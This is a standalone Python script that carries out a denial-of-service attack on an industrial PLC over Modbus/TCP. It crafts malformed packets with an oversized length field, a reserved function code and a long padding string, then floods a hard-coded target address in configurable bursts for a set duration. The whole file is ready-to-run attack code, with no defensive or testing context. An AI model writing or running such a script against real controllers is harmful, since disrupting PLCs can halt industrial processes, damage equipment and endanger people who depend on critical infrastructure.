import socket
import struct
import time
import random

# Configuration - Adjust these based on your specific setup
PLC_IP = "192.168.9.24"  # PLC IP Address (obtained from provided documentation)
MODBUS_PORT = 502
DOS_PACKET_SIZE = 1472 # Maximum Ethernet payload size (less headers)
ATTACK_DURATION = 60  # Attack duration in seconds
BURST_SIZE = 50       # Number of packets to send per burst
SLEEP_TIME = 0.01     # Time to sleep between bursts (adjust for intensity)

def craft_modbus_request():
    """Crafts a malformed Modbus request packet."""

    # Transaction Identifier (2 bytes) - Random
    transaction_id = random.randint(0, 65535)
    # Protocol Identifier (2 bytes) - Always 0 for Modbus/TCP
    protocol_id = 0
    # Length (2 bytes) - Incorrect or unusually large value to cause parsing issues
    length = 65530 #Very big value that could crash the server
    # Unit Identifier (1 byte)
    unit_id = 1
    # Function Code (1 byte) - Invalid or less common code
    function_code = 132 # 0x84 - Likely unsupported or reserved
    # Data (Variable length) - Fill with random bytes or long strings
    data = b"A" * 65520 # long string to crash the server
    
    packet = struct.pack(">H H H B B", transaction_id, protocol_id, length, unit_id, function_code) + data

    return packet

def dos_attack(target_ip, target_port):
    """Performs a Denial-of-Service attack by sending malformed Modbus requests."""

    start_time = time.time()
    packet_count = 0

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5) #Avoid infinite loop

        try:
            sock.connect((target_ip, target_port))
        except socket.timeout:
            print(f"Connection timed out to {target_ip}:{target_port}. Check IP/Connectivity.")
            return
        except ConnectionRefusedError:
            print(f"Connection refused by {target_ip}:{target_port}. Ensure Modbus server is running.")
            return
        except Exception as e:
            print(f"Error connecting: {e}")
            return


        while time.time() - start_time < ATTACK_DURATION:
            for _ in range(BURST_SIZE):
                # Craft malformed Modbus requests
                packet = craft_modbus_request()

                try:
                    sock.sendall(packet)
                    packet_count += 1
                except socket.error as e:
                    print(f"Error sending packet: {e}")
                    break # Stop sending if there's an error

            time.sleep(SLEEP_TIME)  # Sleep between bursts to control intensity
        print(f"Sent {packet_count} malformed Modbus packets to {target_ip}:{target_port} in {ATTACK_DURATION} seconds.")

    except Exception as e:
        print(f"An error occurred: {e}")

    finally:
        if 'sock' in locals(): #Check if the socket exists before closing
            sock.close()


if __name__ == "__main__":
    print(f"Starting Denial-of-Service attack against {PLC_IP}:{MODBUS_PORT} for {ATTACK_DURATION} seconds.")
    dos_attack(PLC_IP, MODBUS_PORT)
    print("Attack finished.")